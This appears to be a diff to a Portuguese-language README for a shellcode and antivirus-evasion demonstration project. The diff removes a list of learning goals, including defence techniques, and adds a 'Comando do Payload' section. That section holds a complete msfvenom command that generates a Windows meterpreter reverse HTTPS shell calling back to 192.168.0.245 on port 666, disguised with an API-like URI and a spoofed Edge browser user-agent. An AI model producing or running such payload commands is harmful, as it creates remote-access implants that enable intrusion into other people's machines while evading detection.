@@ -19,14 +19,10 @@ Não utilize em ambientes de produção.
 
 ---
 
-##  O que você vai aprender  
-
-- Como funciona o conceito de shellcode  
-- Como softwares de segurança detectam cargas maliciosas  
-- Como é possível empacotar código Python em executáveis  
-- Qual a importância da detecção baseada em comportamento  
-- Técnicas de defesa que podem mitigar esse tipo de ataque  
-
+##  Comando do Payload
+```
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.0.245 LPORT=666 LURI=/api/v1/data/ HTTPUSERAGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.3240.76" -f python
+```
 ---
 
 ##  Assista ao vídeo  
